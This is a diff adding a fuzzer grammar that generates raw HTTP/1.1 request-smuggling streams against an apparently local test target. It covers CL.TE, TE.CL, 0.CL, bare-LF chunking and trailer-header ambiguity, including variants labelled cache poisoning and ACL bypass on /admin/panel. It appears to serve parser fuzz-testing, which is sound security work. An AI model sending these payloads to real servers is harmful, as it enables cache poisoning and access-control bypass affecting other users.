@@ -1,0 +1,70 @@
+# =============================================================================
+# HTTP Request Smuggling Stream Grammar
+#
+# Goal:
+# - Generate raw HTTP/1.1 request streams, not single URLs or JSON blobs
+# - Keep metadata headers in-band so request_smuggling_target.py can classify
+#   grammar-generated inputs without relying on the HRS mutator
+# - Cover classic framing plus trailer-merge / trailer-header ambiguity paths
+# =============================================================================
+
+!root <request_stream>
+!max_depth 6
+
+<request_stream> = <cl_te_stream>
+<request_stream> = <te_cl_stream>
+<request_stream> = <zero_cl_stream>
+<request_stream> = <chunk_bare_lf_stream>
+<request_stream> = <trailer_merge_stream>
+<request_stream> = <trailer_header_stream>
+<request_stream> = <baseline_stream>
+
+# =============================================================================
+# Shared line endings / request chaining
+# =============================================================================
+<line_end> = <crlf>
+
+<header_end> = <line_end><line_end>
+
+<canary_path> = /__canary__/grammar
+
+<canary_request> = GET <canary_path> HTTP/1.1<crlf>Host: backend.local<crlf>Connection: close<crlf><crlf>
+<canary_request_lf> = GET <canary_path> HTTP/1.1<nl>Host: backend.local<nl>Connection: close<nl><nl>
+
+<baseline_stream> = POST /queue/append HTTP/1.1<crlf>Host: backend.local<crlf>User-Agent: wf-grammar-baseline/1.0<crlf>Connection: keep-alive<crlf>Content-Length: 13<crlf><crlf>seed=baseline
+
+# =============================================================================
+# Shared metadata headers understood by request_smuggling_target.py
+# =============================================================================
+<wf_common_cl_te> = X-WF-Request-ID: grammar-cl-te<line_end>X-WF-Family: cl_te<line_end>X-WF-Tags: CL.TE,content_length,transfer_encoding<line_end>X-WF-Transport: h1_raw<line_end>X-WF-Delivery: oneshot_h1<line_end>X-WF-Probe: none<line_end>X-WF-Pause-MS: 0<line_end>X-WF-Chunk-Shape: classic<line_end>X-WF-H2-Mode: none<line_end>X-WF-H2-End-Stream: normal<line_end>X-WF-Impact: none<line_end>X-WF-Canary-Path: <canary_path><line_end>X-WF-Mode: stable<line_end>X-WF-Axis-Framing: CL<line_end>X-WF-Axis-Leniency: strict<line_end>X-WF-Axis-Chunk: none<line_end>X-WF-Axis-Connection: keepalive<line_end>X-WF-Axis-Timing: none<line_end>X-WF-Axis-Routing: host<line_end>X-WF-Stream-Shape: body_plus_canary<line_end>
+
+<wf_common_te_cl> = X-WF-Request-ID: grammar-te-cl<line_end>X-WF-Family: te_cl<line_end>X-WF-Tags: TE.CL,content_length,transfer_encoding<line_end>X-WF-Transport: h1_raw<line_end>X-WF-Delivery: oneshot_h1<line_end>X-WF-Probe: none<line_end>X-WF-Pause-MS: 0<line_end>X-WF-Chunk-Shape: classic<line_end>X-WF-H2-Mode: none<line_end>X-WF-H2-End-Stream: normal<line_end>X-WF-Impact: none<line_end>X-WF-Canary-Path: <canary_path><line_end>X-WF-Mode: stable<line_end>X-WF-Axis-Framing: TE<line_end>X-WF-Axis-Leniency: strict<line_end>X-WF-Axis-Chunk: none<line_end>X-WF-Axis-Connection: keepalive<line_end>X-WF-Axis-Timing: none<line_end>X-WF-Axis-Routing: host<line_end>X-WF-Stream-Shape: body_plus_canary<line_end>
+
+<wf_common_zero_cl> = X-WF-Request-ID: grammar-zero-cl<line_end>X-WF-Family: 0_cl<line_end>X-WF-Tags: 0.CL,method_body_mismatch<line_end>X-WF-Transport: h1_raw<line_end>X-WF-Delivery: oneshot_h1<line_end>X-WF-Probe: none<line_end>X-WF-Pause-MS: 0<line_end>X-WF-Chunk-Shape: none<line_end>X-WF-H2-Mode: none<line_end>X-WF-H2-End-Stream: normal<line_end>X-WF-Impact: none<line_end>X-WF-Canary-Path: <canary_path><line_end>X-WF-Mode: stable<line_end>X-WF-Axis-Framing: 0<line_end>X-WF-Axis-Leniency: whitespace_before_colon<line_end>X-WF-Axis-Chunk: none<line_end>X-WF-Axis-Connection: keepalive<line_end>X-WF-Axis-Timing: none<line_end>X-WF-Axis-Routing: host<line_end>X-WF-Stream-Shape: padding_plus_canary<line_end>
+
+<wf_common_chunk_bare_lf> = X-WF-Request-ID: grammar-bare-lf<nl>X-WF-Family: chunk_bare_lf<nl>X-WF-Tags: TE.TE,bare_lf<nl>X-WF-Transport: h1_raw<nl>X-WF-Delivery: oneshot_h1<nl>X-WF-Probe: none<nl>X-WF-Pause-MS: 0<nl>X-WF-Chunk-Shape: bare_lf<nl>X-WF-H2-Mode: none<nl>X-WF-H2-End-Stream: normal<nl>X-WF-Impact: none<nl>X-WF-Canary-Path: <canary_path><nl>X-WF-Mode: stable<nl>X-WF-Axis-Framing: TE<nl>X-WF-Axis-Leniency: strict<nl>X-WF-Axis-Chunk: bare_lf<nl>X-WF-Axis-Connection: keepalive<nl>X-WF-Axis-Timing: none<nl>X-WF-Axis-Routing: host<nl>X-WF-Stream-Shape: body_plus_canary<nl>
+
+<wf_common_trailer_merge> = X-WF-Request-ID: grammar-trailer-merge<line_end>X-WF-Family: trailer_merge<line_end>X-WF-Tags: TE.TE,trailer_merge<line_end>X-WF-Transport: h1_raw<line_end>X-WF-Delivery: oneshot_h1<line_end>X-WF-Probe: none<line_end>X-WF-Pause-MS: 0<line_end>X-WF-Chunk-Shape: trailer_merge<line_end>X-WF-H2-Mode: none<line_end>X-WF-H2-End-Stream: normal<line_end>X-WF-Impact: cache_poison<line_end>X-WF-Canary-Path: <canary_path><line_end>X-WF-Mode: stable<line_end>X-WF-Axis-Framing: TE<line_end>X-WF-Axis-Leniency: strict<line_end>X-WF-Axis-Chunk: trailer_override_path<line_end>X-WF-Axis-Connection: keepalive<line_end>X-WF-Axis-Timing: none<line_end>X-WF-Axis-Routing: x_original_url<line_end>X-WF-Stream-Shape: trailers_plus_canary<line_end>
+
+<wf_common_trailer_header> = X-WF-Request-ID: grammar-trailer-header<line_end>X-WF-Family: trailer_header_ambiguity<line_end>X-WF-Tags: TE.TE,trailer_header_ambiguity<line_end>X-WF-Transport: h1_raw<line_end>X-WF-Delivery: oneshot_h1<line_end>X-WF-Probe: none<line_end>X-WF-Pause-MS: 0<line_end>X-WF-Chunk-Shape: trailer_headers<line_end>X-WF-H2-Mode: none<line_end>X-WF-H2-End-Stream: normal<line_end>X-WF-Impact: acl_bypass<line_end>X-WF-Canary-Path: <canary_path><line_end>X-WF-Mode: stable<line_end>X-WF-Axis-Framing: TE<line_end>X-WF-Axis-Leniency: strict<line_end>X-WF-Axis-Chunk: trailer_override_host<line_end>X-WF-Axis-Connection: keepalive<line_end>X-WF-Axis-Timing: none<line_end>X-WF-Axis-Routing: authority_conflict<line_end>X-WF-Stream-Shape: trailers_plus_canary<line_end>
+
+# =============================================================================
+# Classic CL.TE / TE.CL
+# =============================================================================
+<cl_te_stream> = POST /queue/append HTTP/1.1<crlf><wf_common_cl_te>Host: backend.local<crlf>Transfer-Encoding: chunked<crlf>Content-Length: 4<crlf>Connection: keep-alive<crlf><crlf>5<crlf>HELLO<crlf>0<crlf><crlf><canary_request>
+
+<te_cl_stream> = POST /queue/append HTTP/1.1<crlf><wf_common_te_cl>Host: backend.local<crlf>Content-Length: 14<crlf>Transfer-Encoding: chunked<crlf>Connection: keep-alive<crlf><crlf>3<crlf>ABC<crlf>0<crlf><crlf><canary_request>
+
+# =============================================================================
+# 0.CL and bare-LF chunking
+# =============================================================================
+<zero_cl_stream> = GET /reflect/prefix HTTP/1.1<crlf><wf_common_zero_cl>Host: backend.local<crlf>Content-Length : 11<crlf>Connection: keep-alive<crlf><crlf>SMUGGLED=1<canary_request>
+
+<chunk_bare_lf_stream> = POST /queue/append HTTP/1.1<nl><wf_common_chunk_bare_lf>Host: backend.local<nl>Transfer-Encoding: chunked<nl>Connection: keep-alive<nl><nl>5<nl>HELLO<nl>0<nl><nl><canary_request_lf>
+
+# =============================================================================
+# Trailer merge / trailer header ambiguity
+# =============================================================================
+<trailer_merge_stream> = POST /cache/store HTTP/1.1<crlf><wf_common_trailer_merge>Host: backend.local<crlf>Transfer-Encoding: chunked<crlf>X-Original-URL: /front-cache/base<crlf>Trailer: X-Original-URL, X-Trailer-Canary<crlf>Connection: keep-alive<crlf><crlf>A<crlf>cache=true<crlf>0<crlf>X-Original-URL: /trailer-cache/grammar<crlf>X-Trailer-Canary: merged<crlf><crlf><canary_request>
+
+<trailer_header_stream> = POST /admin/panel HTTP/1.1<crlf><wf_common_trailer_header>Host: backend.local<crlf>Transfer-Encoding: chunked<crlf>Trailer: Host, X-Forwarded-Host<crlf>Connection: keep-alive<crlf><crlf>5<crlf>ALLOW<crlf>0<crlf>Host: trailer-grammar.invalid<crlf>X-Forwarded-Host: trailer-grammar.invalid<crlf><crlf><canary_request>
